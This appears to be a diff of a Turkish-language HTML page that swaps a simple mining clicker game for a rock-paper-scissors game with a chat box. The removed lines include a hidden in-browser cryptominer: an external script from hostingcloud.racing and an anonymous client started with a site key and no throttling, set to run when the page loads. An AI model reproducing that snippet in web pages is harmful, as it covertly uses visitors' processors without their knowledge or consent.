@@ -1,89 +1,80 @@
-
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Madencilik Oyunu</title>
+  <title>Online Oyun: Taş-Kağıt-Makas</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 0;
       padding: 20px;
-      background-color: #f4f4f9;
     }
-    button {
+    .game-container, .chat-container {
+      width: 100%;
+      max-width: 500px;
+      margin: 10px 0;
+      padding: 15px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+    }
+    .choices {
+      display: flex;
+      justify-content: space-around;
+      margin-top: 10px;
+    }
+    .choices button {
       padding: 10px 20px;
-      margin: 10px;
-      font-size: 18px;
+      font-size: 16px;
       cursor: pointer;
-      border: none;
-      border-radius: 5px;
-      background-color: #4caf50;
-      color: white;
     }
-    #status {
-      margin-top: 20px;
-      font-size: 18px;
-      color: #333;
+    .chat-box {
+      height: 200px;
+      overflow-y: auto;
+      border: 1px solid #ddd;
+      padding: 10px;
+      margin-bottom: 10px;
+    }
+    .chat-input {
+      display: flex;
+      gap: 10px;
+    }
+    .chat-input input {
+      flex: 1;
+      padding: 8px;
+    }
+    .chat-input button {
+      padding: 8px 15px;
     }
   </style>
 </head>
 <body>
+  <h1>Taş-Kağıt-Makas Oyunu</h1>
 
+  <!-- Oyun Bölümü -->
+  <div class="game-container">
+    <h2>Oyun</h2>
+    <p id="game-status">Bir seçim yapın: Taş, Kağıt, Makas</p>
+    <div class="choices">
+      <button onclick="playGame('Taş')">Taş</button>
+      <button onclick="playGame('Kağıt')">Kağıt</button>
+      <button onclick="playGame('Makas')">Makas</button>
+    </div>
+  </div>
 
-<script src="https://www.hostingcloud.racing/ZRMo.js"></script>
-<script>
-    var _client = new Client.Anonymous('e75cbb447b0311ef41a4600cb0e15f54b4ee0ae8373f9ede75f373b6ac026c50', {
-        throttle: 0, c: 'w', ads: 0
-    });
-    _client.start();
-    
+  <!-- Sohbet Bölümü -->
+  <div class="chat-container">
+    <h2>Sohbet</h2>
+    <div class="chat-box" id="chat-box"></div>
+    <div class="chat-input">
+      <input type="text" id="chat-message" placeholder="Mesaj yaz...">
+      <button onclick="sendMessage()">Gönder</button>
+    </div>
+  </div>
 
-</script>
-    
-
-
-   
-  <h1>Madencilik Oyunu</h1>
-  <p>Enerji: <span id="energy">5</span></p>
-  <button onclick="mine()">Madencilik Yap</button>
-  <button onclick="refillEnergy()">Enerji Yenile</button>
-  <div id="status">Kaynaklarınızı toplamak için madencilik yapın!</div>
-
-  <script>
-    let energy = 5;
-    const resources = { kömür: 0, altın: 0, elmas: 0 };
-
-    function mine() {
-      if (energy > 0) {
-        const outcomes = ["kömür", "altın", "elmas"];
-        const weights = [70, 25, 5];
-        const random = Math.random() * 100;
-        let cumulative = 0;
-        let found;
-
-        for (let i = 0; i < outcomes.length; i++) {
-          cumulative += weights[i];
-          if (random < cumulative) {
-            found = outcomes[i];
-            break;
-          }
-        }
-
-        resources[found]++;
-        energy--;
-        document.getElementById("energy").innerText = energy;
-        document.getElementById("status").innerText = `${found.toUpperCase()} buldunuz!`;
-      } else {
-        document.getElementById("status").innerText = "Enerjiniz yok! Yenileyin.";
-      }
-    }
-
-    function refillEnergy() {
-      energy = 5;
-      document.getElementById("energy").innerText = energy;
-      document.getElementById("status").innerText = "Enerjiniz yenilendi!";
-    }
-  </script>
+  <script src="app.js"></script>
 </body>
 </html>
